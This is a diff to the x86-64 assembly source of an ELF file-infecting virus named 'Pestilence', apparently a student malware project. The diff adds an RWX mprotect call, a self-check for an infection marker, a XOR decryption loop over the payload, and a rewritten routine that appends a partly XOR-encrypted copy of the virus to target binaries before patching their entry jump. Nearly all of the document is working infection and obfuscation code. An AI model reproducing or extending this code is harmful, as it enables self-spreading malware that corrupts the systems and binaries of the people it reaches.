@@ -59,6 +59,7 @@
 ; 	🦓 r15 + 1300 = ehdr
 ; 	🐴 r15 + 1304 = ehdr.class                      ELF class.
 ; 	🦄 r15 + 1308 = ehdr.pad                        Unused padding for alignment.
+;			r15 + 1309 ->> encryption key
 ; 	🦓 r15 + 1324 = ehdr.entry                      Entry point virtual address.
 ; 	🐴 r15 + 1332 = ehdr.phoff                      Offset of the program header table.
 ; 	🦄 r15 + 1354 = ehdr.phentsize                  Size of each program header entry.
@@ -91,28 +92,15 @@
 ; r15 + 1508                                        entry dpuente
 ; r15 + 1516	(5 bytes)							jmp instruction
 
-; r15 + 1532                                        proc name buffer
-
+; r15 + 1524	; self fd
+; r15 + 1530	; is_encrypted buffer
 global _start
 
 section .text
 _start:
-	; db 0xeb, 0xff, 0xc0
-	; .mprotect:
-
-	; 	mov rdi, 4095
-	; 	not rdi
-	; 	call .get_rip
-	; 	.get_rip:
-	; 		pop rbp
-	; 	and rdi, rbp
-	; 	mov rsi, 4096
-	; 	mov rdx, 7 ; PROT_READ | PROT_WRITE | PROT_EXEC
-	; 	mov rax, SYS_MPROTECT
-	; 	syscall
 	S_IRUSR equ 256 ; Owner has read permission
 	S_IWUSR equ 128 ; Owner has write permission
-
+	mov r9, [rsp + 8]; save program name
 	push rdx
 	push rsp
 	sub  rsp, PESTILENCE_STACK_SIZE                    ; Reserve some espace in the register r15 to store all the data needed by the program
@@ -128,9 +116,59 @@ _start:
 
 ; 	cmp rax, 0
 ; 	jl _end
+_mprotect:
+	lea rdi, [rel _start]
+	mov rsi, _end - _start
+	mov r10, rdi
+	and rdi, -0x1000 ; 4096 
+	neg rdi
+	add r10, rdi
+	neg rdi
+	mov rdx, 7 ; PROT_READ | PROT_WRITE | PROT_EXEC
+	mov rax, SYS_MPROTECT
+	syscall
 
 	mov rax, SYS_GETGID
 	syscall
+_is_encrypted:
+	lea rdi, [r9]
+	mov rsi, O_RDONLY
+	mov rax, SYS_OPEN
+	syscall
+	mov [r15 + 1524], rax
+
+	; pread (fd, buff, len, off)
+	mov rdi, [r15 + 1524]
+	lea rsi,[ r15 + 1530]
+	mov rdx, 1
+	mov r10, 8
+	mov rax, SYS_PREAD64
+	syscall
+
+	cmp byte [r15 + 1530], 'I'
+	jne _payload
+	
+_decypher:
+	mov rax, -1 ;i = -1
+	mov rdx, pestilence - _payload
+	xor r9, r9
+	call .get_rip
+	.get_rip:
+		pop rbp
+		sub rbp, .get_rip
+	.loop:
+		inc rax
+		lea rsi, [rbp + _payload] ; (rbp + (payload - start ) )
+		add rsi, rax
+		; add rsi, _evade_specific_process - _start
+		xor byte [rsi], 42
+		cmp rax, rdx
+		jle .loop
+	nop
+	nop
+	nop
+	nop
+_payload:
 
 _evade_specific_process:                                  ; cd to /proc
 	mov qword [r15], '/pro'
@@ -601,16 +639,30 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			imul rax, rax, 1
 
 		_append_virus:
-			mov rdi, [r15 + 1420]
-			xor rdi, 0xab01
-			lea rsi, [rbp + _start]
-			mov rdx, _stop - _start
-			imul rax, rax, 1
-			mov r10, rax                           ; end of target to start appending
-			mov rax, SYS_PWRITE64
-			xor rdi, 0xab01
-			syscall
+			xor r8, r8 ; i = 0
+			mov r9, _stop - _start ; virus length
+			mov rdi, [r15 + 1420]  ; fd
+			; mov byte r8, [rbp + _start] ; buffer to cypher
+			lea rsi, [rbp + _start]		; memory to write
 
+			.loop:
+				mov rdx, 1
+				lea rsi, [rbp + _start + r8]
+				; if r8 > _payload - _start && r8 < pestilence - _start
+				cmp r8, _payload - _start
+				jl .nocypher
+				.cypher:
+					cmp r8, pestilence - _start
+					jge .nocypher
+					xor byte rsi, 42
+				.nocypher:
+				; mov byte r8, [rbp + _start + rcx]
+				mov rax, SYS_WRITE
+				syscall
+				inc rsi
+				inc r8
+				cmp r8, r9
+				jl .loop
 			mov rax, SYS_SYNC
 			syscall
 
@@ -668,6 +720,8 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			mov byte [r15 + 1516], 0xe9
 			mov r9, [r15 + 1508]
 			mov [r15 + 1517], r9
+		_generate_encryption_key:
+			
 
 		_write_patched_jump:
 			mov rdi, [r15 + 1420]
@@ -684,18 +738,18 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 
 		_next_phdr:
 			inc word [r15 + 1484]
-			_mprotect:
+			; _mprotect:
 
-				mov rdi, 4095
-				not rdi
-				call .get_rip
-				.get_rip:
-					pop rbp
-				and rdi, rbp
-				mov rsi, 4096
-				mov rdx, 7 ; PROT_READ | PROT_WRITE | PROT_EXEC
-				mov rax, SYS_MPROTECT
-				syscall
+			; 	mov rdi, 4095
+			; 	not rdi
+			; 	call .get_rip
+			; 	.get_rip:
+			; 		pop rbp
+			; 	and rdi, rbp
+			; 	mov rsi, 4096
+			; 	mov rdx, 7 ; PROT_READ | PROT_WRITE | PROT_EXEC
+			; 	mov rax, SYS_MPROTECT
+			; 	syscall
 		; 	nop
 		_pseudo_jump:
 			; call .get_rip
